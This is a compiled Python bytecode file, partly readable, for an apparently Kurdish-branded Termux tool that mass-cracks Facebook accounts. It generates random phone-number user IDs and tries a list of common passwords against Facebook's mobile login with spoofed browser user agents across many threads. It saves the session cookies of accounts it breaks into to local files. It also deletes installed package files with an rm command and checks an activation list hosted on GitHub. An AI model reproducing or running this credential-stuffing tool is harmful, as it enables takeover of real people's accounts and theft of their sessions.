a
    %adi6  �                   @   s�  d dl Z d dlZd dlZe �d� ee �� ��d�Zede � z@ee�	d�j
v rfed� e�d� ned� e�d� e�  W n ey�   ed	� Y n0 d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZe �d
� d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ z,d dlZd dlmZ d dl Z d dl!mZ W n( e"�y�   e �d� e �d� Y n0 dd� Z#dd� Z$dd� Z%G dd� d�Z&dZ'dZ(dZ)dZ*dZ+d Z,dZ-dZ.d!Z/d!Z0d"Z1d#Z2d$Z3d%Z4d&Z5d'Z6d(Z7d)Z8d*Z9d+Z:d,Z;d-Z<d.Z=dZ5d$Z1dZ>d!Z?d/Z.dZ/d0Z4d1Z@d"ZAd#ZBd0Z-dZ'dZ(dZ)dZ*dZ+d Z,e�C� ZCeC�Dd2�ZEe�C� ZFeFjGZHeFjIZJeFjKZLe�M� ZMe-e.e/e0e1e2e3e4gZNe�OeN�ZPe�C� ZCeC�Dd2�ZEe�C� ZFeFjGZHeFjIZJeFjKZLe�M� ZMed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� ed3� d dlQZQd ZReRd4k �r0eSd5�ZTeSd6�ZUeTd7k�reUd8k�red9� �q0ned:� eRd7 ZR�qܐq�e �d;� d<ZVd aWg aXg aYd=d;� ZZd d>lm[Z\ d d?l mZ] e^e\� d@ �Z_e_dAk�r�e_dA Z`dBZane_Z`dCZaz2edD� dEZbdFZcdFZceeb�ecv �r�e �d;� n W n   edG� Y n0 dHdI� Zdg Zeg ZfegdJ�D ]�ZhdKZie�Og dL��ZjdMZke�Og dN��Zle�mddO�Zne�Og dN��ZodPZpe�mdQdR�ZqdSZre�mdTdU�Zse�mdVdW�ZtdXZuei� d3ej� dYek� el� en� eo� dZep� eq� d[er� d[es� d[et� d3eu� �Zvef�wev� �q�d\d]� Zrd^d_� Zxe#�  dS )`�    NzMrm -f /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/*Z123z[91mYOUR ID:[1;91m zBhttps://raw.githubusercontent.com/kurdomafea/KURDOO/main/kurdo.txtz[92m YOUR ID IS ACTIVE .....�   z[91m YOUR ID IS NOT ACTIVEz[91mConnection Errorzgit pull)�BeautifulSoup)�date)�datetime)�sleep)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4c                  C   s�   t �d� tt� td� td� td� td� td� td� td�} | d	krXt�  d d
krnt �d� tS d dkr�t �d� tS d dkr�t �d� d dkr�t �d� d S d S )N�clear�=[1;92muN   [1;91m[[1;92m1[1;91m][1;96m 𝙲𝚁𝙰𝙲𝙺 𝚁𝙰𝙽𝙳𝙾𝙼 z#[1;91m[[1;92m2[1;91m][1;94m   1z"[1;91m[[1;92m3[1;91m][1;95m  2z![1;91m[[1;92m4[1;91m][1;93m 3u0   [1;91m[[1;92m0[1;91m][1;91m 𝙴𝚇𝙸𝚃uQ   
[1;32m[1;91m[[1;93m✮[1;91m][1;36m𝙷𝙰𝙻𝙱𝚉𝙷𝙴𝚁𝙰 : �1�2zxdg-open https://t.me/MAMAKURDO�3�4z xdg-open https://t.me/@MAMAKURDO�0�exit)�os�system�jalan�logo�print�input�iZyes)�opt� r   �#/storage/emulated/0/tollll/KURDO.py�khld%   s,    




r   c              	   C   sh  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkrdtdtttttf � nHtdt	� �t
 � tt|��D ](}tdt|d || �dd�tf � q�| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dk�rtdtttttf � nRtdt� �t � tt|��D ]*}tdt|d || �dd�tf � �q0td� d S )Nz7https://m.facebook.com/settings/apps/tabbed/?tab=active�cookie��cookies�html.parserZform�post)�methodc                 S   s   g | ]
}|j �qS r   ��text��.0r   r   r   r   �
<listcomp>A   �    zcek_apk.<locals>.<listcomp>Zh3r   z.%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  u'   [🎮] %s [1;95m YOUR ACTIVE APPS   :z[%s%s] %s%sr   zDitambahkan padaz Ditambahkan padaz9https://m.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   s   g | ]
}|j �qS r   r"   r$   r   r   r   r&   M   r'   z8%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           
u)   [🎮] %s [1;95m YOUR EXPIRED APPS    :ZKedaluwarsaz Kedaluwarsa� )�getr#   r   �findZfind_all�lenr   �N�MZgreen�GREEN�range�replaceZred)�session�coki�w�sop�xZgamer   r   r   r   �cek_apk=   s&    
&
(r6   c                 C   s\   t |jdd|ifi d��jd�}|jd
i d���d�}|jd	t|� d|ifi d��j d S )Nz5https://m.facebook.com/profile.php?id=100015315258519r   r   r   �a�Ikuti)�stringZhref�https://m.facebook.com)r7   r8   )r   r)   r#   r*   �str)�selfr1   r2   �rr)   r   r   r   �followW   s    �����r>   c                   @   s   e Zd Zdd� ZdS )r   c                 C   s2   |d D ]$}t j�|� t j��  t�d� qd S )N�
g����MbP?)�sys�stdout�write�flush�timer   )r<   �z�er   r   r   �__init__a   s    
zjalan.__init__N)�__name__�
__module__�__qualname__rG   r   r   r   r   r   `   s   r   z[1;91mz[1;97mz[1;32mz[1;33mz[1;34mz[1;35mz[1;92mz[1;94mz[1;95mz[1;96mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz[1;31mz[1;37mz[1;93mz%H:%M� l   M�? uS   [0;93m                   𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 𝙱𝙽𝚄𝚂𝙰 : uR   [0;93m                   𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝙱𝙽𝚄𝚂𝙰 : Z22Z77ug   [0;31m                   𝙱𝙰𝚇𝙴𝚁 𝙱𝙴𝚃 𝙱𝙾 𝚃𝙾𝙾𝙻𝙴 @MAMAKURDO...u�   [0;97m                   𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝙷𝙰𝙻𝙰𝚈𝙰 𝙳𝚆𝙱𝙰𝚃𝚁𝙰 𝙱𝙺𝙰𝚆𝙰 !? r	   z�  

[;90m===============================================================

 

        
[1;90m===============================================================c                   C   s   t �d� tt� d S )Nr	   )r   r   r   r   r   r   r   r   r	   �   s    
)�	localtime)r   �   �   ZPMZAMz(

[1;33mLOADING ASSET FILES ... [0;97mg������@z5.2z*
[1;31mNO INTERNET CONNECTION ... [0;97mc                 C   s<   g d�}|D ]*}t d|  | �f tj��  t�d� qd S )N)z.   z..  z... z.... �r   )r   r@   rA   rC   rD   r   )r#   Ztitik�or   r   r   �dynamic  s    rQ   i'  zMozilla/5.0 (Linux; U; Android)
r   r   �5�6�7�8�9�10Z11Z12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�Lr-   r,   �O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   r   ih  i$  �(   �   zMobile Safari/537.36z; z) �.c                  C   s�  g } g }t j t j t �d� tt� td� td� td� td�}td� t �d� td�}t �d� tt� ttd��}t	|�D ]&}d�
d	d
� t	d�D ��}| �|� q�tdd��� }t�  tt| ��}tdt� dt� dt� dt� dt� dt� d�tt� d tt� d � d t d � td| � td| � td| � td� td� td� | D ]H}	|	ddddddd d!d"d#d$d%d&d'd(d)d*d+g}
||	 }|�t||
|� �qbW d   � n1 �s�0    Y  td,� d S )-Nr	   r
   uU   [1;91m[[1;91m➠➠[1;91m][1;36m NUMBER - [1;33m [1;34m0750 [1;35m [1;31m0751z>[1;92m
uB   [1;35m[1;91m[[1;94m☏☏[1;91m][1;31mRAQAM :[1;92m[1;31m r(   z@MAMAKURDO   BNUSA : u�   𝙸𝙳𝚈𝙰𝙺𝙰𝙽   BNUSA 5000 : [1;91m5000, [1;92m, [1;93m, [1;94m

[1;91m[1;91m[[1;92m✮✮[1;91m][1;34m𝙲𝙷𝙰𝙽𝙳 [ 𝙸𝙳 ] 𝙳𝙰𝚆𝙴𝚃 :][1;36m c                 s   s   | ]}t �tj�V  qd S )N)�random�choicer9   �digits)r%   �_r   r   r   �	<genexpr>@  r'   zi.<locals>.<genexpr>�   �2   )Zmax_workersu`   [1;91m[[1;93m✔︎[1;91m][1;94m 𝚃𝙾𝙳𝙰𝚈 𝙳𝙰𝚃𝙴 & 𝚃𝙸𝙼𝙴  :rK   �/z~> �:�   uI   [1;91m[[1;93m✔︎[1;91m][1;91m 𝙽 𝙰 𝙼 𝙴 :[1;96m [1;92muE   [1;91m[[1;93m✔︎[1;91m][1;95m 𝚁 𝙰𝚀𝙰 𝙼 : [1;96mu@   [1;91m[[1;93m✔︎[1;91m][1;96m 𝙸 𝙳 𝚂    : [1;93mu(   [1;91m[[1;93m✔︎[1;91m][1;92m ...u4   [1;91m[[1;93m✔︎[1;91m][1;95m 𝚁𝙻 ] ....z=[1;93mZkurd1234Z	kurd12345Z
kurd123456Zhama1234Z	hama12345ZzaxozaxoZzaxo1234Z
1234554321Z	zaxo12345Zhama12Zahmad123Z	ahmad1234ZKURD1234Z	KURD12345Z11223344Z1212Z07500750Z12344321u}    𝙲𝚁𝙰𝙲𝙺 𝚃𝙰𝚆𝙰𝚆 𝙱𝙾 𝚃𝙺𝙰𝚈𝙰 𝙳𝚆𝙱𝙰𝚁𝙰 𝙱𝙺𝙰𝚆𝙰 ...¡ )r   �getuid�geteuidr   r   r   r   r   �intr/   �join�append�
ThreadPoolr	   r;   r+   �RED�ha�bu�tar.   r7   �lt�tagZsubmit�rcrack)�userZtwf�codeZbal�limitZnmbrZnmpZmanshera�tlZlove�pwx�uidr   r   r   r   .  sD    


T*4r   c                 C   s,  �z|D �]�}t �t�}t�� }|�d�j}t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�dd| |dd	�	}d
dddddddddddddd|d�}|jd||d�j}	|j�� �� }
d|
v �rfd�dd� |j�� �� D ��}|d d!� }td"|  d# | d$ | d% | d& � t||� td'd(��|d# | d) � t�|�  �q�qd*|
v rd�d+d� |j�� �� D ��}|d,d-� }td.|  d# | d& � td/d(��|d# | d0 � t�|�  �q�qqqtd7 atj�d1tt|tt�tt�f �f tj��  W n   Y n0 d S )2Nr:   zname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"r   zLog In)	ZlsdZjazoestZm_tsZliZ
try_numberZunrecognized_tries�email�passZloginzm.facebook.comZGETz%https://www.facebook.com/?_rdc=1&_rdr�httpsz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zgzip, deflate, brzen-US,en;q=0.9zhttps://m.facebook.com/z>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"z?0z	"Windows"ZdocumentZnavigatezsame-originr   )Z	authorityr!   �path�scheme�acceptzaccept-encodingzaccept-languageZrefererz	sec-ch-uazsec-ch-ua-mobilezsec-ch-ua-platformzsec-fetch-destzsec-fetch-modezsec-fetch-sitezupgrade-insecure-requestsz
user-agentz?https://m.facebook.com/login/device-based/regular/login/?refsrc)�data�headersZc_user�;c                 S   s   g | ]\}}|d  | �qS ��=r   �r%   �key�valuer   r   r   r&   {  r'   zrcrack.<locals>.<listcomp>rz   �   z[1;32m[HASTA HALPARA-OK] z | u&     
[1;35m[√][1;32mCOOKIE = [1;34mu     
[1;36m[√] [AGENT] = [1;35mz	  [0;97mz/sdcard/HALPARA-OK.txtr7   r?   Z
checkpointc                 S   s   g | ]\}}|d  | �qS r�   r   r�   r   r   r   r&   �  r'   �   �'   u   [1;30m[🥲-CP]  u%   /sdcard/𝚂𝙾𝙽𝙽1_𝙲-CP.txtz 
u+   %s[HALPARA ] [%s/%s]  OK ۰ %s  CP ۰ %s )ru   rv   �ugen�requestsZSessionr)   r#   �re�searchr;   �groupr    r   Zget_dict�keysr�   �itemsr   r6   �openrB   �oksr�   �cps�loopr@   rA   r_   r+   rC   )r�   r�   r�   ZpsZpror1   Zfree_fbZlog_dataZheader_freefb�loZlog_cookiesr2   Zcidr   r   r   r�   R  sn    

��
(


$r�   )yr   r�   rD   r   r;   �getegidr�   �idr   r)   r#   r   r   r   r@   Zjsonru   r�   r9   �platform�base64�uuidZbs4r   r4   Zressr   r   ZwaktuZconcurrent.futuresr   r�   Z	mechanizeZrequests.exceptions�ModuleNotFoundErrorr   r6   r>   r   r�   �WHITEr.   �YELLOW�BLUEZORANGEre   r-   r_   rb   rY   rj   rd   r,   rX   ZBNZBBLZBPZBBZBKZBHZBMZBArZ   r[   r\   r]   r^   �now�strftimeZ	dt_string�current�yearr�   �monthr�   �dayr�   �todayZmy_colorrv   ZwarnaZgetpassZattempsr   �username�passwordr   r�   r�   r�   r	   rL   r�   �cmdr�   Zltxr7   r�   �v�updaterQ   Zugen2r�   r/   ZxdZaa�b�c�d�	randrangerF   �f�g�hr   �j�k�lZuaku2r�   r�   r   r   r   r   �<module>   s�  



P

	
�




B$?